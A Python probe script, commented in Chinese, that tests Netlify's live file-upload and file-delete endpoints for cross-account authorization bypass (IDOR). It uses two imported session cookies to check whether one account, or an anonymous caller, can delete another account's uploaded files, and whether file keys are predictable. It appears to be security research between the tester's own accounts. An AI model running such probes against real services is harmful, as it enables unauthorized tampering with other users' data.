# -*- coding: utf-8 -*-
"""删除链:真实 key × (cookie, accountId) 越权矩阵"""
import http.client, ssl, gzip, brotli, json, sys, time, urllib.parse
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A, COOKIE_B

ACC_A = '6a979dd2ae93f47d55b62897'
ACC_B = '6a97b6454fef0db964f75db6'
ctx = ssl.create_default_context()
KEYS = {}

def req(path, cookie=None, method='POST', body=None, timeout=20):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json'}
    if cookie: h['Cookie'] = cookie
    if body is not None:
        h['Content-Type'] = 'application/octet-stream'
    t0 = time.time()
    conn.request(method, path, body=body, headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br': raw = brotli.decompress(raw)
    elif enc == 'gzip': raw = gzip.decompress(raw)
    dt = time.time() - t0
    st = r.status
    b = raw.decode('utf-8', 'ignore').replace('\n', ' ')[:250]
    conn.close()
    return st, dt, b

def upload(acc, fn, cookie):
    p = '/api/agent-runner-file-upload?accountId=%s&filename=%s' % (acc, urllib.parse.quote(fn, safe=''))
    st, dt, b = req(p, cookie, body=b'content-' + fn.encode())
    key = None
    try:
        key = json.loads(b)['file_key']
    except Exception:
        pass
    print('UPLOAD %-12s %s %5.1fs | %s' % (fn, st, dt, b))
    return key

def dele(acc, key, cookie, label):
    p = '/.netlify/functions/agent-runner-file-delete?accountId=%s&fileKey=%s' % (acc, urllib.parse.quote(key, safe=''))
    st, dt, b = req(p, cookie)
    print('%-46s %s %5.1fs | %s' % (label, st, dt, b))
    return st, b

print('== 1. B 上传 3 个文件 ==')
k1 = upload(ACC_B, 'del-probe-1.txt', COOKIE_B)
k2 = upload(ACC_B, 'del-probe-1.txt', COOKIE_B)   # 同名重传 -> uuid 是否一致?
k3 = upload(ACC_B, 'del-probe-2.txt', COOKIE_B)
print('k1 =', k1)
print('k2(同名) =', k2)
print('k3 =', k3)
print('k1==k2 (key 可预测?):', k1 == k2)

print()
print('== 2. 删除矩阵(用 k1)==')
if k1:
    dele(ACC_B, k1, COOKIE_B, 'B+ACC_B+k1 (基线,应成功)')
    st, b = dele(ACC_B, k1, COOKIE_B, 'B+ACC_B+k1 再删 (应 not found?)')
    st, b = dele(ACC_B, k1, COOKIE_A, 'A+ACC_B+k1 (A 删 B 的文件!)')
    st, b = dele(ACC_A, k1, COOKIE_A, 'A+ACC_A+k1 (参数A+keyB)')
    st, b = dele(ACC_A, k1, COOKIE_B, 'B+ACC_A+k1 (参数A+keyB+B)')
    st, b = dele(ACC_B, k1, None,      'ANON+ACC_B+k1')

print()
print('== 3. 用 k3 复验(若被删则不可再删)==')
if k3:
    st, b = dele(ACC_B, k3, COOKIE_A, 'A+ACC_B+k3 (A 删 B 的文件!)')
    st, b = dele(ACC_B, k3, COOKIE_A, 'A+ACC_B+k3 再删')
    st, b = dele(ACC_B, k3, COOKIE_B, 'B+ACC_B+k3 (对照基线)')
print('done')
